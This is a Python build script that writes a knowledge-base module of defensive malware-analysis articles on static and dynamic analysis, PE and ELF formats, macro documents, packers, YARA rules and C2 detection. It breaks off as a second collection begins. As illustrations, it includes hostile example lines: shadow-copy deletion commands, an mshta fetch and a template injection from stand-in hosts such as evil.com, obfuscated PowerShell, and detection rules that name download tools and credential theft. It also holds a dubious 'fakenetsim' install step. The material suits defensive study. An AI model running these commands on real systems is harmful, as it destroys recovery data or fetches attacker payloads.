"""Build script: writes kb_forensics_advanced.py from scratch."""
import os

OUTPUT = "C:/Users/Tomo/ixion/src/ion/data/kb_forensics_advanced.py"

# Write header
with open(OUTPUT, "w", encoding="utf-8") as f:
    f.write('"""Built-in KB data: Advanced Forensics & Malware Analysis Articles."""\n\n')

print("Header written.")

def append(text):
    with open(OUTPUT, "a", encoding="utf-8") as f:
        f.write(text)

# ============================================================
# COLLECTION 1 — MALWARE_FUNDAMENTALS
# ============================================================
append('''MALWARE_FUNDAMENTALS = [
    {
        "title": "Static Analysis Workflow — PE Headers, Strings, Imports, Hashing",
        "tags": ["malware-analysis", "static-analysis", "pe-format", "strings", "hashing", "dfir"],
        "content": """# Static Analysis Workflow

## Step 1 — Hashing

```bash
md5sum malware.exe && sha256sum malware.exe
ssdeep malware.exe          # Fuzzy hash for variant matching
```

Submit SHA256 to VirusTotal, MalwareBazaar, Hybrid Analysis.

## Step 2 — File Type Identification

```bash
file malware.exe
xxd malware.exe | head -2
die malware.exe             # Detect-It-Easy: packer/compiler detection
```

Common magic bytes: PE=`4D 5A`, ELF=`7F 45 4C 46`, OLE=`D0 CF 11 E0`, ZIP=`50 4B 03 04`.

## Step 3 — PE Header Analysis

```python
import pefile, datetime, math

pe = pefile.PE('malware.exe')

# Compile timestamp
ts = pe.FILE_HEADER.TimeDateStamp
print("Compile time:", datetime.datetime.utcfromtimestamp(ts), "UTC")

# Section entropy (> 7.0 = packed/encrypted)
def entropy(data):
    if not data: return 0.0
    c = {}
    for b in data: c[b] = c.get(b,0)+1
    return -sum((v/len(data))*__import__('math').log2(v/len(data)) for v in c.values())

for s in pe.sections:
    name = s.Name.decode('utf-8', errors='replace').rstrip('\\x00')
    ent = entropy(s.get_data())
    flag = " << PACKED" if ent > 7.0 else ""
    print(f"{name:12} entropy={ent:.2f}{flag}")
```

Key PE fields: `TimeDateStamp` (often spoofed), `Machine` (0x14C=x86, 0x8664=x64), section characteristics (RWX = suspicious), entry point location (in last section = packer stub), and overlay data (appended payload/config).

## Step 4 — String Extraction

```bash
strings -n 8 malware.exe          # ASCII, minimum 8 chars
strings -el malware.exe           # Unicode little-endian
floss malware.exe                 # Also decodes stack strings
```

Key patterns: `http://`, `https://`, `HKEY_`, `%APPDATA%`, `%TEMP%`, `cmd.exe`, `powershell`, mutex names, IP addresses.

## Step 5 — Import Analysis

```bash
python3 -c "
import pefile
pe = pefile.PE('malware.exe')
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    print(entry.dll.decode())
    for imp in entry.imports:
        if imp.name: print(' ', imp.name.decode())
"
```

High-risk import combinations:
- `VirtualAllocEx + WriteProcessMemory + CreateRemoteThread` = process injection
- `CryptEncrypt / BCryptEncrypt` = ransomware encryption
- `InternetOpen + InternetConnect` = HTTP C2
- `GetAsyncKeyState + SetWindowsHookEx` = keylogging
- `WNetAddConnection2 + NetShareEnum` = lateral movement

## Step 6 — Resource Extraction

```python
import pefile
pe = pefile.PE('malware.exe')
if hasattr(pe, 'DIRECTORY_ENTRY_RESOURCE'):
    for t in pe.DIRECTORY_ENTRY_RESOURCE.entries:
        for n in t.directory.entries:
            for l in n.directory.entries:
                data = pe.get_data(l.data.struct.OffsetToData, l.data.struct.Size)
                if data[:2] == b'MZ': print("EMBEDDED PE!")
```

Also check for overlays: data appended after the last section (common config/payload location).
""",
    },
    {
        "title": "Dynamic Analysis — Sandbox Setup, Behavioral Indicators, API Monitoring",
        "tags": ["malware-analysis", "dynamic-analysis", "sandbox", "behavioral", "api-monitoring"],
        "content": """# Dynamic Analysis — Sandbox Setup and Behavioral Indicators

## VM Environment

- Guest OS: Windows 10 22H2 x64
- Network: Host-only + FakeNet-NG (simulated DNS/HTTP)
- Tools: ProcMon, Process Hacker, Wireshark, Regshot, API Monitor, x64dbg

```bash
# FakeNet-NG setup:
pip install fakenetsim
fakenetsim &
```

## ProcMon Filters

```
Include: Process Name = malware.exe
Exclude: Path contains Prefetch
Exclude: Operation = QueryNameInformationFile
Exclude: Result = BUFFER OVERFLOW
```

Use Regshot: take snapshot before execution, another after, compare for all registry changes.

## Behavioral Indicators

### Process Tree Red Flags

```
SUSPICIOUS PARENT-CHILD:
  WINWORD.EXE → powershell.exe       (Office spawning PS)
  svchost.exe → cmd.exe              (service spawning shell)
  explorer.exe → mshta.exe           (script host from explorer)

INJECTION INDICATORS:
  CreateRemoteThread into svchost.exe/explorer.exe
  Suspended child process + WriteProcessMemory
  Self-delete after execution
```

### File System

```
HIGH RISK LOCATIONS:
  %TEMP%, %APPDATA%, C:\\ProgramData  → stage-2 drop zones
  C:\\Windows\\System32              → DLL hijack or masquerade

RANSOMWARE:
  Mass file rename/encryption
  README_DECRYPT.txt, !!!HOW_TO_DECRYPT!!!.txt
  vssadmin delete shadows /all /quiet
```

### Registry Persistence

```
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce
HKLM\\SYSTEM\\CurrentControlSet\\Services\\<name>
HKCU\\Software\\Classes\\CLSID\\<guid>\\InprocServer32  (COM hijack)
```

### Network

```
DNS to DGA domains (high NX rate, random-looking FQDNs)
HTTP beaconing: regular intervals, POST /gate.php, fake User-Agent
Custom port C2: 4444, 1337, 8080, 31337
Large outbound transfers (exfiltration)
```

## API Monitor Key Categories

```
Process:   CreateProcess, OpenProcess, CreateRemoteThread
Memory:    VirtualAllocEx, WriteProcessMemory, NtAllocateVirtualMemory
Network:   WSAConnect, connect, InternetOpen, HttpSendRequest
Registry:  RegSetValueEx, RegCreateKeyEx
Crypto:    CryptEncrypt, BCryptEncrypt, CryptGenKey
```

## Noriben Automated Collection

```bash
python Noriben.py --timeout 120 --cmd malware.exe
# Produces: Noriben_Report.txt (filtered IOCs), Noriben_IOCs.txt
```

## CAPE Sandbox

```bash
curl -X POST http://cape/tasks/create/file -F file=@malware.exe
curl http://cape/tasks/report/<id>/json
# Auto-extracts configs for: Emotet, QakBot, Cobalt Strike, Redline
```

## Behavioral Report Template

```
Sample: malware.exe | SHA256: ... | Duration: 120s

PROCESS TREE:
  malware.exe (1234) → cmd.exe (1456) → powershell.exe (1678) -EncodedCommand <b64>

DROPS:
  %APPDATA%\\svchost32.exe  (MD5: xx)
  C:\\ProgramData\\update.bat

REGISTRY:
  SET HKCU\\...\\Run\\Updater = "%APPDATA%\\svchost32.exe"

NETWORK:
  DNS: update.evil.com → NXDOMAIN
  HTTP POST: http://185.220.x.x/gate.php
    UA: Mozilla/5.0 (compatible; MSIE 9.0)
    Body: id=ABC123&os=Win10

VERDICT: RAT with HTTP C2. Persistence via Run key.
```
""",
    },
    {
        "title": "Malware Types — Ransomware, RATs, Wipers, Cryptominers, Rootkits",
        "tags": ["ransomware", "rat", "wiper", "cryptominer", "rootkit", "malware-types"],
        "content": """# Malware Types Reference

## Ransomware

Modern ransomware operates as RaaS (Ransomware-as-a-Service). Affiliates conduct intrusions; developers take 20–30% cut.

### Attack Chain

```
Initial Access → Persistence → PrivEsc → Lateral Movement →
Defense Evasion → Exfiltration (double extortion) → Encryption → Ransom Note
```

### Universal IOCs

```powershell
# Nearly all modern ransomware deletes shadow copies:
vssadmin delete shadows /all /quiet
wmic shadowcopy delete
bcdedit /set {default} recoveryenabled No
```

### Encryption Schemes

| Family | Algorithm |
|---|---|
| WannaCry | RSA-2048 wraps AES-128-CBC per file |
| Ryuk | RSA-4096 wraps AES-256 |
| LockBit 3.0 | Curve25519 ECDH + AES-128 |
| BlackCat/ALPHV | ChaCha20 + RSA-4096 (written in Rust) |

## Remote Access Trojans (RATs)

Full remote control: shell, file management, keylogging, screen capture, credential theft.

| Family | Language | Notes |
|---|---|---|
| AsyncRAT | .NET | Open source, widely abused |
| QuasarRAT | .NET | GitHub project |
| Cobalt Strike | Java | Commercial; dominant in enterprise intrusions |
| Sliver | Go | Open-source C2 alternative to CS |

```bash
netstat -ano | findstr ESTABLISHED   # Find unusual outbound connections
schtasks /query /fo LIST /v | findstr "Task To Run"  # Suspicious scheduled tasks
```

## Wipers

Destroy data irreversibly — geopolitical attack tool, no recovery intended.

| Family | Context | Technique |
|---|---|---|
| NotPetya | Ukraine 2017 | Overwrites MBR, fake ransomware wrapper |
| WhisperGate | Ukraine 2022 | MBR overwrite + stage-2 file corruptor |
| HermeticWiper | Ukraine 2022 | Abuses EaseUS Partition driver |
| AcidRain | Viasat 2022 | Firmware wiper for embedded Linux modems |

## Cryptominers

Mine Monero (XMR) using victim CPU/GPU. Common in cloud misconfiguration exploits.

```bash
ps aux | grep -i "xmrig\|minerd\|cpuminer"
netstat -ano | findstr ":3333\|:4444\|:14444"  # Stratum mining pool ports
```

```yara
rule XMRig { strings: $p="pool.supportxmr.com" $s="stratum+tcp://" condition: any of them }
```

## Rootkits

| Type | Privilege | Example |
|---|---|---|
| User-mode | Ring 3 | LD_PRELOAD hooks (Linux), IAT/EAT hooks |
| Kernel-mode | Ring 0 | TDL4, ZeroAccess, DKOM |
| Bootkit | Pre-OS | LoJax (BIOS) |
| UEFI | Ring -2 | CosmicStrand, MosaicAggressor |

```bash
# Kernel rootkit detection via memory forensics:
vol.py -f mem.raw windows.pslist   # ActiveProcessLinks traversal
vol.py -f mem.raw windows.psscan   # Pool-tag scan (bypasses DKOM)
# PIDs in psscan but not pslist = DKOM-hidden process = rootkit indicator
```
""",
    },
    {
        "title": "PE File Format Deep Dive — Sections, IAT, Resources",
        "tags": ["pe-format", "sections", "iat", "static-analysis", "malware-analysis"],
        "content": """# PE File Format Deep Dive

## File Layout

```
DOS Header (64b)  →  PE Signature (4b)  →  COFF File Header (20b)
→  Optional Header (224/240b)  →  Section Table (40b/section)
→  Section Data  →  Overlay (optional)
```

## Key Header Fields

```c
// COFF File Header
WORD  Machine;        // 0x14C=x86, 0x8664=x64, 0xAA64=ARM64
WORD  NumberOfSections;
DWORD TimeDateStamp;  // Compile time Unix timestamp (often spoofed)
WORD  Characteristics; // DLL, EXE, stripped, etc.

// Optional Header
DWORD AddressOfEntryPoint; // RVA where execution begins
DWORD ImageBase;           // Preferred load address
WORD  Subsystem;           // 2=GUI, 3=Console, 1=Native driver
WORD  DllCharacteristics;  // 0x0040=ASLR, 0x0100=DEP, 0x4000=CFG
```

## Section Table

```c
typedef struct _IMAGE_SECTION_HEADER {
    BYTE  Name[8];       // Null-padded name
    DWORD VirtualSize;   // In-memory size
    DWORD VirtualAddress;// RVA in memory
    DWORD SizeOfRawData; // On-disk size
    DWORD Characteristics; // Permission flags
};

// Characteristics:
// 0x20000000 = Execute; 0x40000000 = Read; 0x80000000 = Write
// RWX = 0xE0000020 = RED FLAG (injected/unpacked code)
```

### Common Sections

| Name | Contents |
|---|---|
| .text | Executable code |
| .data | Initialized global data |
| .rdata | Read-only data, imports |
| .rsrc | Resources (icons, embedded files) |
| .reloc | Base relocations |
| UPX0/UPX1 | UPX packer |
| .themida | Themida/WinLicense protector |

## Section Entropy Analysis

```python
import pefile, math
def entropy(data):
    if not data: return 0.0
    c = {}
    for b in data: c[b] = c.get(b,0)+1
    return -sum((v/len(data))*math.log2(v/len(data)) for v in c.values())

pe = pefile.PE('malware.exe')
for s in pe.sections:
    name = s.Name.decode('utf-8', errors='replace').rstrip('\\x00')
    ent  = entropy(s.get_data())
    print(f"{name:12} {ent:.3f}" + (" << PACKED" if ent > 7.0 else ""))
# > 7.0 with RWX = very high confidence packed
```

## Import Address Table

```python
pe = pefile.PE('malware.exe')
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    print(f"DLL: {entry.dll.decode()}")
    for imp in entry.imports:
        name = imp.name.decode() if imp.name else f"ord#{imp.ordinal}"
        print(f"  [{hex(imp.address)}] {name}")
```

### Suspicious Import Patterns

| Imports | Capability |
|---|---|
| VirtualAllocEx + WriteProcessMemory + CreateRemoteThread | Injection |
| CryptEncrypt / BCryptEncrypt | Encryption (ransomware) |
| InternetOpen + HttpSendRequest | HTTP C2 |
| connect + send + recv | Raw TCP C2 |
| SetWindowsHookEx + GetAsyncKeyState | Keylogger |

## Resource Analysis

```python
pe = pefile.PE('malware.exe')
if hasattr(pe, 'DIRECTORY_ENTRY_RESOURCE'):
    for t in pe.DIRECTORY_ENTRY_RESOURCE.entries:
        for n in t.directory.entries:
            for l in n.directory.entries:
                data = pe.get_data(l.data.struct.OffsetToData, l.data.struct.Size)
                magic = data[:4].hex()
                print(f"Resource {l.data.struct.OffsetToData:#x}: {magic}")
                # 4d5a = PE, 504b0304 = ZIP, d0cf11e0 = OLE
```

## Overlay Detection

```python
pe = pefile.PE('malware.exe')
last = pe.sections[-1]
overlay_offset = last.PointerToRawData + last.SizeOfRawData
with open('malware.exe','rb') as f:
    f.seek(overlay_offset)
    ov = f.read()
if ov:
    print(f"Overlay: {len(ov)} bytes at 0x{overlay_offset:X}, magic: {ov[:8].hex()}")
```

## PE Anomaly Checklist

```
[ ] TimeDateStamp zeroed or in future
[ ] NumberOfSections == 0 or > 20
[ ] Entry point outside .text section
[ ] Sections with RWX permission
[ ] .text entropy > 7.0
[ ] < 10 total imports (likely packed)
[ ] Resources contain embedded PE (MZ magic in resource data)
[ ] Overlay data present (check for MZ, PK, config patterns)
[ ] DLL with no exports, or exports named Install/ServiceMain
```
""",
    },
    {
        "title": "ELF Binary Analysis for Linux Malware",
        "tags": ["elf", "linux-malware", "static-analysis", "malware-analysis", "reverse-engineering"],
        "content": """# ELF Binary Analysis for Linux Malware

## ELF Identification

Magic bytes: `7F 45 4C 46` (`\\x7fELF`)

```bash
file malware.elf
# ELF 64-bit LSB executable, x86-64, dynamically linked, stripped
# "stripped" = symbol table removed; harder to analyze
# "statically linked" = all libs bundled = common in IoT botnets

readelf -h malware.elf    # Architecture, entry point, ELF type
readelf -S malware.elf    # Section list with types and sizes
readelf -d malware.elf | grep NEEDED  # Runtime library deps
ldd malware.elf            # Library resolution (blank = static)
```

## Symbol and Import Analysis

```bash
# Imported symbols (UND = imported from shared library):
readelf -s malware.elf | grep "UND"

# All global symbols:
readelf -s malware.elf | grep "GLOBAL"
nm malware.elf 2>/dev/null

# PLT stubs for dynamic calls:
objdump -d malware.elf | grep "@plt"
```

## Security Properties

```bash
checksec --file=malware.elf
# RELRO: Full = GOT read-only (blocks GOT overwrites)
# STACK CANARY: present = stack overflow harder
# NX: enabled = non-executable stack
# PIE: enabled = ASLR applies to binary
# Malware: typically minimal security flags, often no PIE
```

## String Extraction

```bash
strings malware.elf
strings -n 6 malware.elf
floss malware.elf          # Obfuscated/stack strings

# IoC patterns:
grep -E "https?://|/tmp/|/dev/shm/|crontab|wget|curl|chmod 777|iptables"
# /tmp/ and /dev/shm/ = dropper staging areas
# /dev/shm/ = RAM filesystem, no disk artifact
```

## Mirai Botnet Analysis

```bash
# Indicators of Mirai-family malware:
# - Statically linked (portable across MIPS/ARM/x86)
# - Embedded 62-entry default credential list
# - Scans random IPs port 23/2323 (telnet brute force)
# - Self-propagation + DDoS modules

strings mirai.arm | grep -E "root:|admin:|default:|/bin/busybox"
# Credential list visible in static strings
```

## LD_PRELOAD Rootkits

```bash
# Injected into every process via /etc/ld.so.preload
# Hooks: readdir (hides files/processes), fopen/read (hides connections)

# Detection:
cat /etc/ld.so.preload
cat /proc/<pid>/environ | tr '\\0' '\\n' | grep LD_PRELOAD

# Cross-view detection:
ls /proc/ | sort > readdir_output.txt
ls -d /proc/[0-9]* | sort > direct_proc.txt
diff readdir_output.txt direct_proc.txt
# Lines only in direct_proc = processes hidden by rootkit
```

## Dynamic Analysis

```bash
strace -f -e trace=network,file,process ./malware.elf 2>&1 | tee strace.log
ltrace ./malware.elf 2>&1 | tee ltrace.log

tcpdump -i any -w cap.pcap &
./malware.elf
kill %1

# eBPF non-intrusive tracing:
bpftrace -e 'tracepoint:syscalls:sys_enter_execve { printf("exec: %s\\n", str(args->filename)); }'
```

## YARA Detection

```yara
rule Suspicious_ELF_Dropper {
    strings:
        $elf   = { 7F 45 4C 46 }
        $tmp   = "/tmp/"
        $shm   = "/dev/shm/"
        $wget  = "wget" nocase
        $curl  = "curl" nocase
        $chmod = "chmod 777"
    condition:
        $elf at 0 and filesize > 500KB and 3 of ($tmp,$shm,$wget,$curl,$chmod)
}
```
""",
    },
    {
        "title": "Document Malware — Macro Analysis, OLE Streams, VBA Stomping",
        "tags": ["document-malware", "macro-analysis", "ole", "vba", "maldoc"],
        "content": """# Document Malware Analysis

## File Type Identification

```bash
xxd malware.doc | head -2
# D0 CF 11 E0 = OLE (old .doc/.xls/.ppt)
# 50 4B 03 04 = ZIP (new .docx/.xlsx/.docm)

file malware.*
```

## oletools Suite

```bash
pip install oletools

oleid malware.doc          # Quick triage: macros? encrypted? Flash?
olevba malware.doc         # Extract + analyze VBA source code
olevba --deobf malware.doc # Attempt deobfuscation
olemeta malware.doc        # Author, company, revision count
rtfobj malware.rtf         # Extract embedded objects from RTF
```

### olevba Key Indicators

| Type | Keyword | Significance |
|---|---|---|
| AutoExec | AutoOpen, Document_Open | Runs without user interaction |
| Suspicious | Shell, WScript.Shell | System command execution |
| Suspicious | CreateObject + powershell | PowerShell invocation |
| Suspicious | Base64 strings | Encoded payload |
| IOC | http://... | C2 or payload URL |

## VBA Deobfuscation

```vba
' Concatenation:
s = "pow" & "er" & "she" & "ll"   → "powershell"

' Chr() encoding:
Chr(80) & Chr(111) & Chr(119) ...  → "Pow..."
```

```python
# Decode Chr() sequence:
python3 -c "print(''.join(chr(x) for x in [80,111,119,101,114,115,104,101,108,108]))"
```

```bash
# Decode -EncodedCommand (UTF-16LE base64):
python3 -c "import base64,sys; print(base64.b64decode(sys.argv[1]).decode('utf-16-le'))" "<b64>"
```

## VBA Stomping

The compiled p-code (bytecode) retains malicious logic while the human-readable source is replaced with benign code. Most AV scans only the source.

```bash
# Detection:
olevba malware.doc | grep -i "stomp"

# Dump p-code:
pip install pcodedmp
pcodedmp malware.doc

# If source = "Sub AutoOpen() End Sub" but pcodedmp shows Shell/WScript calls
# → stomped macro detected
```

## Template Injection (.docx)

```bash
unzip malware.docx -d doc/
cat doc/word/_rels/document.xml.rels
# <Relationship Type=".../attachedTemplate"
#   Target="http://attacker.com/evil.dotm"/>
# Word fetches template on open, executes its macros
```

## Process Tree to Monitor

```
WINWORD.EXE
  └─ cmd.exe
       └─ powershell.exe -WindowStyle Hidden -EncodedCommand <b64>
            └─ mshta.exe http://evil.com/payload.hta
```

## YARA Detection

```yara
rule Maldoc_AutoExec_Shell {
    strings:
        $ole   = { D0 CF 11 E0 A1 B1 1A E1 }
        $auto1 = "AutoOpen" nocase
        $auto2 = "Document_Open" nocase
        $auto3 = "Workbook_Open" nocase
        $shell = "Shell" nocase
        $ps    = "powershell" nocase
        $wsh   = "WScript.Shell" nocase
    condition:
        $ole at 0 and 1 of ($auto*) and 2 of ($shell,$ps,$wsh)
}
```
""",
    },
    {
        "title": "Packing and Obfuscation — UPX, Custom Packers, Entropy Analysis",
        "tags": ["packing", "upx", "entropy", "obfuscation", "malware-analysis"],
        "content": """# Packing and Obfuscation

## Detecting Packed Samples

```bash
die malware.exe     # Detect-It-Easy: identifies packer, compiler, protector
strings malware.exe | grep -i upx
```

Shannon entropy thresholds: 5.0–6.5 = normal compiled code; > 7.0 = compressed/encrypted; > 7.2 = strong packing indicator.

```python
import pefile, math

def entropy(data):
    if not data: return 0.0
    c = {}
    for b in data: c[b] = c.get(b,0)+1
    return -sum((v/len(data))*math.log2(v/len(data)) for v in c.values())

pe = pefile.PE('malware.exe')
for s in pe.sections:
    name = s.Name.decode('utf-8', errors='replace').rstrip('\\x00')
    ent  = entropy(s.get_data())
    print(f"{name:12} entropy={ent:.3f}" + (" << HIGH" if ent > 7.0 else ""))
```

Additional indicators: fewer than 10 imports, entry point in last section, VirtualSize >> SizeOfRawData (runtime expansion), unnamed sections.

## UPX

```bash
# Identify: section names UPX0/UPX1, or strings "UPX!"
strings malware.exe | grep -i upx

# Unpack:
upx -d malware.exe -o unpacked.exe

# If header tampered (prevents upx -d):
# 1. Restore UPX0/UPX1 section names in hex editor
# 2. Or: run in debugger, memory BP on execution when UPX sections fill,
#         reach OEP, dump with Scylla
```

UPX stub: decompress UPX1 → UPX0 buffer, fix imports via GetProcAddress, jump to OEP.

## Custom Packers — OEP Finding

```
x64dbg workflow:
1. Run until initial setup
2. Alt+M → find RWX section (unpacked payload)
3. Right-click section → Set Memory Breakpoint on Execution
4. F9 → packer jumps to OEP → debugger breaks
5. Plugins → Scylla → IAT Autosearch → Get Imports → Dump + Fix Dump
6. Analyze unpacked binary statically
```

### XOR Decryptor Pattern

```asm
mov ecx, length
mov esi, packed_data
mov al,  key
.loop:
    xor [esi], al
    inc esi
    loop .loop
jmp packed_data   ; OEP jump
```

### RC4 Recognition

```python
# KSA pattern: two consecutive 256-iteration loops
# Loop 1: S[i] = i (trivial init)
# Loop 2: j = (j + S[i] + key[i%len]) % 256; swap(S[i], S[j])
# Then PRGA streaming loop

def rc4(key, data):
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0; out = bytearray()
    for b in data:
        i = (i+1)%256; j = (j+S[i])%256; S[i],S[j] = S[j],S[i]
        out.append(b ^ S[(S[i]+S[j])%256])
    return bytes(out)
```

## .NET Obfuscation

```bash
die malware.exe  # or: strings malware.exe | grep mscoree.dll

# De-obfuscate ConfuserEx (most common):
de4dot.exe malware.exe -o deobfuscated.exe
de4dot.exe --detect malware.exe

# Decompile with dnSpy or ILSpy
```

## PowerShell Obfuscation

```powershell
# 1. Base64 encoded command:
powershell.exe -EncodedCommand <Base64>

# 2. Tick marks (ignored by parser):
po`wer`she`ll -nop -w hi`dden -c "IEX(...)"

# 3. String reverse:
$cmd = "llehsrewop"; iex ($cmd[-1..-($cmd.length)] -join "")
```

```bash
# Decode -EncodedCommand:
python3 -c "import base64,sys; print(base64.b64decode(sys.argv[1]).decode('utf-16-le'))" "<b64>"
```
""",
    },
    {
        "title": "YARA Rules — Writing, Testing, and Deploying Detection Signatures",
        "tags": ["yara", "detection", "signatures", "malware-analysis", "threat-hunting"],
        "content": """# YARA Rules — Writing, Testing, and Deploying

## Rule Structure

```yara
rule RuleName : tags {
    meta:
        author = "SOC Team"
        date   = "2025-01-15"
        description = "Detects XYZ malware"
        score  = 75

    strings:
        $s1 = "literal string"
        $s2 = "case insensitive" nocase
        $s3 = "utf16 string" wide
        $s4 = "both" ascii wide
        $h1 = { 4D 5A 90 00 }              // Hex pattern
        $h2 = { 4D [2-4] 5A ?? 90 }        // Wildcards
        $h3 = { 4D (5A|5B) 90 }            // Alternation
        $r1 = /https?:\/\/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/
        $x1 = "powershell" xor             // All single-byte XOR variants
        $b1 = "IEX" base64                 // Base64-encoded variant

    condition:
        uint16(0) == 0x5A4D and
        filesize < 2MB and
        2 of ($s*) and $h1
}
```

## Condition Reference

```yara
2 of ($s*)           // At least 2 of s-prefixed strings
all of ($h*)         // All h-prefixed strings
any of them          // Any defined string
$s at 0              // String at file offset 0
$s in (0..100)       // String in first 100 bytes
#s > 3               // More than 3 occurrences
@s[1]                // Offset of first match
uint16(0) == 0x5A4D  // PE magic at offset 0
uint32(0) == 0x464C457F  // ELF magic

// PE module conditions:
pe.imports("kernel32.dll", "VirtualAllocEx")
pe.number_of_sections > 5
pe.sections[0].characteristics & pe.SECTION_MEM_WRITE
pe.timestamp == 0
```

## Production Rules

### Cobalt Strike Beacon

```yara
rule CobaltStrike_Beacon {
    meta: description = "CS staged beacon indicators"
    strings:
        $shellcode = { FC E8 [4-8] 60 89 E5 }
        $pipe1 = "\\\\.\\pipe\\msagent_" wide
        $pipe2 = "\\\\.\\pipe\\MSSE-" wide
        $cfg   = { 00 01 00 01 00 02 }
    condition:
        (uint16(0) == 0x5A4D or uint32(0) == 0x464C457F) and
        (2 of ($*))
}
```

### Process Injection

```yara
rule ProcessInjection_Classic {
    condition:
        uint16(0) == 0x5A4D and
        pe.imports("kernel32.dll", "VirtualAllocEx") and
        pe.imports("kernel32.dll", "WriteProcessMemory") and
        (pe.imports("kernel32.dll", "CreateRemoteThread") or
         pe.imports("kernel32.dll", "QueueUserAPC"))
}
```

### Ransomware Generic

```yara
rule Ransomware_Generic {
    strings:
        $vss1 = "vssadmin" nocase
        $vss2 = "delete shadows" nocase
        $bcd  = "bcdedit" nocase
        $note1 = "decrypt" nocase fullword
        $note2 = "bitcoin" nocase fullword
        $note3 = "ransom" nocase fullword
    condition:
        uint16(0) == 0x5A4D and
        (2 of ($vss*,$bcd) or 3 of ($note*))
}
```

### Mimikatz

```yara
rule Mimikatz {
    strings:
        $s1 = "mimikatz" nocase
        $s2 = "sekurlsa" nocase
        $s3 = "lsadump::sam" nocase
        $s4 = "privilege::debug" nocase
        $s5 = "sekurlsa::logonpasswords" nocase
    condition: any of them
}
```

## Testing

```bash
# Single file:
yara -r rule.yar malware.exe

# Directory:
yara -r rules/ /path/to/samples/

# False positive check:
yara -r rule.yar /Windows/System32/ 2>/dev/null | wc -l
# Should be 0

# Python integration:
python3 -c "
import yara
rules = yara.compile('rule.yar')
matches = rules.match('malware.exe')
for m in matches:
    print(m.rule, [(s.identifier, s.instances[0].offset) for s in m.strings])
"
```

## Deployment

```yaml
# Velociraptor VQL hunt:
SELECT * FROM hunt_results(hunt_id=HuntYARA(
  artifacts=["Windows.Detection.Yara.Process"],
  parameters=dict(YaraRule="rule Bad { strings: $s=\\"malware_ioc\\" condition: $s }")
))
```

```bash
# MISP export:
curl -H "Authorization: <key>" https://misp/attributes/restSearch/returnFormat:yara -o rules.yar
```

## Maintenance

```yara
meta:
    version      = "2.1"
    last_modified = "2025-03-10"
    status       = "production"   // draft / testing / production / retired
// Performance: put filesize/uint16 conditions first (cheap); avoid unbounded regex
```
""",
    },
    {
        "title": "Malware C2 Communication Patterns — HTTP, DNS, Custom Protocols",
        "tags": ["c2", "command-and-control", "http", "dns", "malware-analysis"],
        "content": """# Malware C2 Communication Patterns

## HTTP/HTTPS C2

### Beaconing Characteristics

```
POST /gate.php HTTP/1.1
Host: update.evil-domain.com
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0)
Content-Type: application/x-www-form-urlencoded

id=ABC123&os=Win10&av=Defender&data=<encrypted>
```

Detection indicators:
- Regular intervals (low jitter = automated beacon)
- Consistent response Content-Length
- User-Agent mismatch (claims IE 9 on Win10)
- Connections to newly-registered or bulletproof hosting
- POST to generic paths (/gate.php, /connect, /update)

```bash
# JA3 TLS fingerprinting (Zeek):
zeek-cut ja3 server_name < ssl.log | sort | uniq -c | sort -rn
# CS default JA3: 72a589da586844d7f0818ce684948eea
curl "https://ja3er.com/search/<ja3_hash>"

# JARM server fingerprint:
python jarm.py evil-c2.com 443
```

## DNS C2

```
# Subdomain exfiltration:
MFRA.OBQXE.YLBMFUYDSMFZGK43.c2.evil.com  (base32-encoded data in labels)

# TXT record commands:
dig TXT cmd.evil.com +short
# "Y21kOiBpcGNvbmZpZw==" = base64("cmd: ipconfig")
```

```bash
# Detection via Zeek DNS logs:
# Long FQDNs (> 60 chars):
zeek-cut query < dns.log | awk '{if(length>60) print}' | sort -u

# High entropy subdomains (Shannon entropy > 3.5):
zeek-cut query < dns.log | awk -F. '{print $1}' | python3 -c "
import sys, math
for line in sys.stdin:
    s = line.strip()
    if len(s) < 8: continue
    c = {}
    for ch in s: c[ch] = c.get(ch,0)+1
    ent = -sum((v/len(s))*math.log2(v/len(s)) for v in c.values())
    if ent > 3.5: print(f'{ent:.2f} {s}')
" | sort -rn
```

## Custom Binary Protocols

```python
# Identify magic bytes and structure from pcap:
from scapy.all import rdpcap, TCP, IP, Raw

packets = rdpcap("session.pcap")
streams = {}
for pkt in packets:
    if IP in pkt and TCP in pkt and Raw in pkt:
        conn = (pkt[IP].src, pkt[TCP].sport, pkt[IP].dst, pkt[TCP].dport)
        streams.setdefault(conn, []).append(bytes(pkt[Raw]))

for conn, payloads in streams.items():
    print(f"{conn[0]}:{conn[1]} -> {conn[2]}:{conn[3]}")
    for i, p in enumerate(payloads[:3]):
        print(f"  [{i}] {p[:32].hex()}")
# Consistent first 4 bytes = magic; bytes 4-5 = type; 6-7 = length
```

## Domain Fronting

```
TLS SNI: legitimate-cdn.cloudfront.net
HTTP Host header: c2.attacker.com (inside TLS)
CDN routes to attacker backend based on Host header
Defenders see only cloudfront.net in logs

Detection: compare SNI (ssl.log) vs Host header (http.log) for mismatches
```

## C2 Infrastructure Pivoting

```bash
# Passive DNS — other domains at same IP:
curl "https://api.securitytrails.com/v1/ips/<IP>/addresses" -H "apikey: <key>"

# Shodan — servers with identical TLS fingerprint:
shodan search "ssl.jarm:<jarm_hash>"

# Certificate pivoting (all domains sharing org name):
curl "https://search.censys.io/api/v2/certificates/search?q=parsed.subject.organization:<org>"
```

## Traffic Decryption

```python
# AES-CBC once key extracted:
from Crypto.Cipher import AES
key = bytes.fromhex("aabbccddeeff00112233445566778899")
iv  = bytes.fromhex("00000000000000000000000000000000")
ct  = bytes.fromhex("<captured_traffic>")
pt  = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)

# RC4:
def rc4(key, data):
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i%len(key)]) % 256; S[i],S[j] = S[j],S[i]
    i = j = 0; out = bytearray()
    for b in data:
        i=(i+1)%256; j=(j+S[i])%256; S[i],S[j]=S[j],S[i]
        out.append(b ^ S[(S[i]+S[j])%256])
    return bytes(out)
```
""",
    },
]
''')
print("Collection 1 written.")

# ============================================================
# COLLECTION 2 — REVERSE_ENGINEERING
# ============================================================
append('''

REVERSE_ENGINEERING = [
    {
